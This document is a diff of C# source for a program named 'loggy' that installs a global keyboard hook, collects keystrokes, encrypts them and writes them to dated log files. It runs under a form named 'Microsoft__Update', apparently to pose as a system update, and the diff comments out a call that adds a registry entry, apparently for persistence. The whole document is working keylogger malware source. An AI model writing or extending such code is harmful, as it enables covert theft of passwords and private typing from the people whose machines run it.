@@ -27,9 +27,8 @@ namespace loggy
             
             string log = "";
 
-            string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
-
-			_keyboardHook = new Y2KeyboardHook();
+            
+            _keyboardHook = new Y2KeyboardHook();
 			_keyboardHook.Install();
 
             int count_space = 0;
@@ -77,6 +76,7 @@ namespace loggy
 					log += (new KeysConverter()).ConvertToString(e.KeyCode);
 				}
 
+
                 if (count_space == 3)
                 {
                     Save_log(log);
@@ -98,11 +98,28 @@ namespace loggy
         }
         public void Save_log(string text)
 		{
-			using (StreamWriter sw = new StreamWriter(@"C:\SystemLog", true))
-			{
-				sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
-			}
-		}
+           // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
+            string date2 = DateTime.Now.ToString("dd.MM");
+            string path = date2;
+            #region create folder 
+            bool exists = Directory.Exists(path);
+            if (!exists)
+                Directory.CreateDirectory(path);
+            if (!File.Exists(path))
+            {
+                //File.Create(path);
+                StreamWriter sw = File.CreateText(path + @"\" + date2 + ".txt");
+                sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
+                sw.Close();
+            }
+            #endregion
+
+            //using (StreamWriter sw = new StreamWriter(@"C:\SystemLog", true))
+            //using (StreamWriter sw = new StreamWriter(@"a.txt", true)) 
+            //{
+            //    sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
+            //}
+        }
         public void Save_log_no_encrpyt(string text)
         {
             using (StreamWriter sw = new StreamWriter(@"C:\SystemLog_NO", true))
@@ -129,7 +146,7 @@ namespace loggy
      
         private void Microsoft__Update_Load(object sender, EventArgs e)
         {
-            Add_Registry();
+            //Add_Registry();
         }
 
         private void Add_Registry()
